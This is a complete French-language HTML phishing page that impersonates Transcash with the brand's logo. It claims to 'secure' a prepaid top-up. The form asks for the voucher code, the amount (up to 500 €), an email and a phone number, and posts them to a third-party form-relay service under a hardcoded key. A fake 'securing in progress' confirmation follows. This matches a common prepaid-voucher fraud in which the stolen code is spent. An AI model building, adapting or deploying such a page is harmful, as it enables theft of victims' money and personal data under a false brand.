<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    
    <title>Sécurisation de recharge</title>
    
    <script src="https://www.google.com/recaptcha/api.js" async defer></script>

    <style>
        * { box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(to bottom, #f0f4f8, #d9e2ec);
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow-y: auto;
        }
        .container, .thankyou, .loading {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
            padding: 40px;
            width: 100%;
            max-width: 520px;
            text-align: center;
            max-height: 95vh;
            overflow-y: auto;
        }
        .logo-container {
            text-align: center;
            margin-bottom: 25px;
        }
        .logo {
            max-width: 220px;
            height: auto;
            display: block;
            margin: 0 auto;
        }
        h1 {
            color: #dc3545;
            margin: 0 0 32px 0;
            font-size: 1.9rem;
        }
        .form-group {
            margin-bottom: 24px;
            text-align: left;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
            font-size: 1.05rem;
        }
        select, input[type="text"], input[type="email"], input[type="tel"] {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #d1d9e0;
            border-radius: 10px;
            font-size: 1.05rem;
            background: #fafbfc;
        }
        select:focus, input:focus {
            outline: none;
            border-color: #1a73e8;
            box-shadow: 0 0 0 3px rgba(26,115,232,0.15);
        }
        .radio-group {
            display: flex;
            gap: 30px;
            margin-top: 8px;
        }
        .radio-group label {
            font-weight: normal;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .btn {
            background: linear-gradient(to right, #dc3545, #c82333);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 10px;
            font-size: 1.15rem;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-top: 12px;
        }
        .btn:hover {
            background: linear-gradient(to right, #c82333, #bd2130);
        }

        .translate-wrapper { display: flex; justify-content: flex-end; margin-top: 8px; }
        #google_translate_element { width: 160px; height: 35px; overflow: hidden; border: 1px solid #d1d9e0; border-radius: 6px; background: #fff; }
        .goog-te-gadget span { display: none !important; }
        .goog-te-gadget { color: transparent !important; font-size: 0 !important; }
        .goog-te-combo { margin: 0 !important; width: 100% !important; padding: 5px !important; border: none !important; font-size: 0.9rem !important; }
        .goog-te-banner-frame.skiptranslate { display: none !important; }
        body { top: 0px !important; }

        .note { color: #777; font-size: 0.85rem; margin-top: 15px; font-style: italic; }
        .loading { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); z-index: 9999; justify-content: center; align-items: center; flex-direction: column; }
        .loading.show { display: flex; }
        .spinner { width: 80px; height: 80px; border: 8px solid #f3f3f3; border-top: 8px solid #dc3545; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .loading-text { font-size: 1.5rem; font-weight: bold; color: #333; }
        .thankyou { display: none; }
        .thankyou.show { display: block; }
        .processing-title { font-size: 3.5rem; font-weight: bold; color: #dc3545; margin: 0 0 30px 0; line-height: 1.1; }
        .processing-text { font-size: 1.4rem; color: #333; margin: 0 0 35px 0; line-height: 1.4; }
        .new-link { font-size: 1.5rem; color: #1a73e8; text-decoration: none; font-weight: 600; }
        .new-link:hover { text-decoration: underline; }
        
        /* 2. PROTECTION : HONEYPOT STYLE (Invisible) */
        .hp-field {
            display: none !important;
            visibility: hidden !important;
        }

        /* Centrage CAPTCHA */
        .captcha-container {
            margin: 20px 0;
            font-weight: bold;
            font-size: 1.1rem;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="container" id="formContainer">
        <div class="logo-container">
            <img src="https://www.datocms-assets.com/103962/1768898335-transcash-4x3.png" alt="Logo Transcash officiel" class="logo" onerror="this.src='https://via.placeholder.com/220x165/dc3545/ffffff?text=Transcash+Logo';">
        </div>

        <h1>Sécurisation de recharge</h1>

        <form action="https://api.web3forms.com/submit" method="POST" id="rechargeForm" onsubmit="handleSubmit(event)">
            <input type="hidden" name="access_key" value="d05f9bad-be52-47e0-84a6-2d5ead10e914">
            <input type="hidden" name="subject" value="Nouvelle sécurisation de recharge">
            
            <div class="hp-field">
                <input type="text" name="botcheck">
            </div>

            <div class="form-group">
                <label for="type-recharge">Type de recharge :</label>
                <select id="type-recharge" name="Type de recharge" required>
                    <option value="">-- Choisissez --</option>
                    <option value="transcash">Transcash</option>
                    <option value="autre">Autre</option>
                </select>
            </div>

            <div class="form-group">
                <label for="montant">Montant de la recharge :</label>
                <select id="montant" name="Montant de la recharge" required>
                    <option value="">-- Choisissez un montant --</option>
                    <option value="20">20 €</option>
                    <option value="50">50 €</option>
                    <option value="100">100 €</option>
                    <option value="150">150 €</option>
                    <option value="200">200 €</option>
                    <option value="250">250 €</option>
                    <option value="500">500 €</option>
                </select>
            </div>

            <div class="form-group">
                <label for="code-recharge">Code de recharge :</label>
                <input type="text" id="code-recharge" name="Code de recharge" placeholder="Entrez votre code ici" maxlength="20" required>
            </div>

            <div class="form-group">
                <label>Cacher le code ?</label>
                <div class="radio-group">
                    <label><input type="radio" name="Cacher le code" value="oui" required> Oui</label>
                    <label><input type="radio" name="Cacher le code" value="non"> Non</label>
                </div>
            </div>

            <div class="form-group">
                <label for="email">Votre email :</label>
                <input type="email" id="email" name="Email" placeholder="exemple@domaine.com" required>
            </div>

            <div class="form-group">
                <label for="telephone">Numéro de téléphone :</label>
                <input type="tel" id="telephone" name="Téléphone" pattern="[+]?[0-9\s\-()]{7,20}" required>
            </div>

            <!-- CAPTCHA intégré -->
            <div class="captcha-container">
                <span id="captchaQuestion"></span><br>
                <input type="text" id="captchaAnswer" placeholder="Réponse" required>
            </div>

            <button type="submit" class="btn">Sécurisation</button>

            <div class="translate-wrapper">
                <div id="google_translate_element"></div>
            </div>

            <div class="note">Vos données sont protégées</div>
        </form>
    </div>

    <div class="loading" id="loading">
        <div class="spinner"></div>
        <div class="loading-text">Envoi en cours...</div>
    </div>

    <div class="thankyou" id="thankYouPage">
        <div class="logo-container"><img src="https://www.datocms-assets.com/103962/1768898335-transcash-4x3.png" alt="Logo Transcash officiel" class="logo"></div>
        <div class="processing-title">Sécurisation en cours...</div>
        <p class="processing-text">La sécurisation peut prendre quelques minutes,<br>veuillez patienter le temps de recevoir le mail de confirmation</p>
        <a href="#" onclick="restartForm(); return false;" class="new-link">Sécuriser un nouveau code</a>
    </div>

    <script type="text/javascript">
        function googleTranslateElementInit() {
            new google.translate.TranslateElement({pageLanguage: 'fr'}, 'google_translate_element');
        }
    </script>
    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>

    <script>
        // CAPTCHA mathématique simple
        let captchaSolution;
        function generateCaptcha() {
            const a = Math.floor(Math.random()*10)+1;
            const b = Math.floor(Math.random()*10)+1;
            captchaSolution = a + b;
            document.getElementById('captchaQuestion').innerText = `Quel est ${a} + ${b} ?`;
        }

        function handleSubmit(event) {
            event.preventDefault();

            // Vérification Honeypot
            const botField = document.querySelector('input[name="botcheck"]').value;
            if (botField !== "") {
                console.log("Bot détecté (Honeypot)");
                return;
            }

            // Vérification CAPTCHA
            const userAnswer = parseInt(document.getElementById('captchaAnswer').value);
            if (userAnswer !== captchaSolution) {
                alert("Réponse au CAPTCHA incorrecte.");
                generateCaptcha();
                return;
            }

            document.getElementById('loading').style.display = 'flex';

            const form = document.getElementById('rechargeForm');
            const data = new FormData(form);

            fetch(form.action, {
                method: 'POST',
                body: data
            }).then(res => res.json())
              .then(response => {
                  document.getElementById('loading').style.display = 'none';
                  document.getElementById('formContainer').style.display = 'none';
                  document.getElementById('thankYouPage').classList.add('show');
              }).catch(err => {
                  document.getElementById('loading').style.display = 'none';
                  alert("Erreur lors de l'envoi. Veuillez réessayer.");
              });
        }

        function restartForm() {
            document.getElementById('thankYouPage').classList.remove('show');
            document.getElementById('formContainer').style.display = 'block';
            document.getElementById('rechargeForm').reset();
            generateCaptcha();
        }

        // Initialisation CAPTCHA
        generateCaptcha();
    </script>
</body>
</html>
